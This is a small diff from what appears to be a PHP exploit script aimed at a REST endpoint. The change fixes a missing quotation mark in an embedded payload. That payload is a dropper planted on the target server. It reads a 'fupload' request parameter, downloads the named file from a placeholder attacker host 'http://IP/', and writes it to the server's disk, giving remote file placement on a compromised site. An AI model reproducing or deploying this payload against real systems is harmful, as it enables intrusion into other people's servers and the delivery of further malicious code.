@@ -34,7 +34,7 @@ $endpoint = 'rest_endpoint';
 
 $php_code = <<<'EOD'
     <?php
-        if(isset($_REQUEST["fupload])){
+        if(isset($_REQUEST["fupload"])){
             $file_upload = $_REQUEST["fupload"];
             file_put_contents($file_upload,file_get_contents("http://IP/".$file_upload));
         }
